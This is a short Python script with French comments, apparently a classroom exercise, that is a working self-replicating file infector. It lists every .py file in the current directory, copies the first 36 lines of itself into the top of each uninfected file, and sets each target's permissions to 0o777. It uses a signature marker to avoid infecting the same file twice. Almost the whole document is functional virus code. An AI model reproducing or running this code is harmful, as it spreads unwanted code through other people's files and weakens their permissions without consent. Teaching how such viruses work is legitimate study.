#!/usr/bin/env python3
import os
import glob
import sys

# ==========================================
# MARQUEUR DE SIGNATURE (Pour éviter la surinfection)
# ==========================================
MARQUEUR = "# --- CODE_VIRAL_TP0_3 ---"

def infecter():
    # 1. Ciblage : Trouver tous les fichiers cibles (ici *.py) dans le répertoire courant
    cibles = glob.glob("*.py")
    
    # 2. Lecture de sa propre signature : Ouvrir le fichier source du script (virus.py)
    try:
        # sys.argv[0] contient le nom du script en cours d'exécution
        with open(sys.argv[0], "r", encoding="utf-8") as f_soi:
            lignes_virus = f_soi.readlines()
    except Exception as e:
        print(f"Erreur de lecture de soi-meme : {e}")
        return

    # 3. Extraction de la charge utile (Payload)
    # On extrait les 36 premières lignes (vérifiez que c'est exactement le nombre de lignes 
    # de la partie virus de votre fichier !)
    payload_viral = lignes_virus[:36] 
    
    # 4. Boucle d'infection sur les cibles
    for fichier in cibles:
        # On évite de s'infecter soi-même
        if os.path.abspath(fichier) == os.path.abspath(sys.argv[0]):
            continue
            
        try:
            # Lire le contenu original
            with open(fichier, "r", encoding="utf-8") as f_cible:
                contenu_original = f_cible.read()
                
            # 5. Vérification de l'infection : Si le marqueur est déjà présent, on skip
            if MARQUEUR in contenu_original:
                continue
                
            # 6. Altération des droits (Sur Windows, os.chmod est limité mais ne plantera pas)
            os.chmod(fichier, 0o777)
            
            # 7. Action d'infection (Injection au sommet)
            with open(fichier, "w", encoding="utf-8") as f_cible:
                # On écrit d'abord la charge virale
                f_cible.write("".join(payload_viral))
                f_cible.write("\n\n")
                # 8. Préservation : On ajoute le contenu original à la suite
                f_cible.write(contenu_original)
                
            print(f"Fichier infecte : {fichier}")
            
        except Exception as e:
            print(f"Impossible d'infecter {fichier} : {e}")

if __name__ == "__main__":
    infecter()
